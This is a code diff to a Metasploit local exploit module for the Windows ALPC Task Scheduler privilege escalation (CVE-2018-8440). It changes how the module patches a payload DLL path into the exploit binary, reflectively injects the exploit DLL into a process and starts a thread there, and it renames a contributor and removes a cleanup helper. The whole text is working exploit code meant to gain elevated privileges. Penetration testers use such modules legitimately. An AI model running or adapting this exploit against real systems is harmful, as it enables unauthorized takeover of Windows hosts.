+++ modules/exploits/windows/local/alpc_taskscheduler.rb
@@ -30,7 +30,7 @@ class MetasploitModule < Msf::Exploit::Local
           'SandboxEscaper',       # Original discovery and PoC
           'bwatters-r7',          # msf module
           'asoto-r7',             # msf module
-          'jrobles-r7'            # msf module
+          'Jacob Robles'          # msf module
         ],
       'Platform'       => ['win'],
       'SessionTypes'   => ['meterpreter','shell'],    #TODO: syntax for shell?
@@ -76,42 +76,44 @@ class MetasploitModule < Msf::Exploit::Local
 
   def setup
     super
+    @temp_path = datastore['PATH'] || session.sys.config.getenv('TEMP')
     @payload_name = datastore['PAYLOAD_NAME'] || Rex::Text.rand_text_alpha((rand(8) + 6))
     @payload_name = "#{payload_name}.dll" unless payload_name.match(/\.dll$/i)
-    @temp_path = datastore['PATH'] || session.sys.config.getenv('TEMP')
     @payload_path = "#{temp_path}\\#{payload_name}"
+
     @payload_dll = generate_payload_dll
-    @original_path = ('A' * 80) + '.dll'
+    @original_path = ('A' * 80)
   end
 
-  def overwrite_payload_path(exploit_data, payload_path, original_path)
+  def overwrite_payload_path(exploit_data)
     # The payload path is hard-coded into the exploit
     # We need to change it, but the exploit binary is in UTF-16LE
     # But our parsers (right now) expect it to be encoded as ANSI-8bit
     # Covert the exploit binary to UTF-16, switch the values, then return
     # the encoding to whatever it was to begin with
     print_status("Attempting to change the payload path to #{payload_path}...")
-    print_status("payload path length = #{payload_path.length}...")
-    print_status("original path length = #{original_path.length}...")
+
     if payload_path.length > original_path.length
       fail_with(Failure::BadConfig,"Parameter PAYLOAD_NAME may not exceed #{original_path.length} characters, including extension")
     end
+
     original_encoding = exploit_data.encoding
-    exploit_data.force_encoding("UTF-16LE")
-    padded_path = payload_path + ('x/00' * ((original_path.length)-(payload_path.length)))
+    padded_path = payload_path + ("\x00" * (original_path.length-payload_path.length))
+
     padded_path.encode!("UTF-16LE")
     original_path.encode!("UTF-16LE")
     exploit_data.force_encoding("UTF-16LE")
+
     exploit_data.sub!(original_path, padded_path)
     exploit_data.force_encoding(original_encoding)
   end
 
   def inject_magic(process)
-    library_path = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2018-8440', 'reflective_dll.x64.dll')
+    library_path = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2018-8440', 'ALPC-TaskSched-LPE.dll')
     library_path = ::File.expand_path(library_path)
     dll_data = ''
     ::File.open(library_path, 'rb') { |f| dll_data = f.read }
-    overwrite_payload_path(dll_data, payload_path, original_path)
+    overwrite_payload_path(dll_data)
     print_status("Reflectively injecting the exploit DLL into #{process.pid}...")
     exploit_mem, offset = inject_dll_data_into_process(process, dll_data)
     process.thread.create(exploit_mem + offset)
@@ -153,10 +155,6 @@ class MetasploitModule < Msf::Exploit::Local
         print_error("Unable to delete #{path}")
       end
     end
-  end
-
-  def ensure_clean_exploit_destination
-    ensure_clean_destination(exploit_path)
   end
 
   def ensure_clean_payload_destination
